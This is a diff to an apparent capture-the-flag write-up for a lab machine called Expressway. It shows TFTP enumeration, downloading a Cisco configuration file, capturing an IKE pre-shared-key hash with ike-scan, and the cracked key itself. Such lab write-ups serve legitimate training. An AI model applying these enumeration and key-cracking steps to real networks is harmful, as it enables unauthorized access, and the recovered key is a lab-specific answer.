@@ -42,14 +42,14 @@ Port `69/UDP` (TFTP) is the main initial access vector.
 sudo nmap -sU -p69 --script tftp-enum <IP>
 ```
 
-The script reveals a file named `version 12.3.txt`, containing a Cisco IOS configuration.
+The script reveals a file named `ciscortr.cfg`, containing a Cisco IOS configuration.
 
 Download it:
 
 ```bash
 tftp <IP>
 tftp> binary
-tftp> get "version 12.3.txt"
+tftp> get "ciscortr.cfg"
 ```
 
 ---
@@ -123,7 +123,6 @@ The response confirms:
 sudo ike-scan -A --id=ike@expressway.htb -P hashfile <IP>
 ```
 
-The server reveals the identity `ike@expressway.htb` and returns the PSK hash.
 
 ### 3.3 Cracking the PSK
 
@@ -143,7 +142,7 @@ Recovered PSK:
 freakingrockstarontheroad
 ```
 
-**Note:** The recovered PSK may differ in another environment. Use the hash captured from your own target and the wordlist available to you.
+**Note:** Use the hash captured from your own target and the wordlist available to you.
 
 ---
 
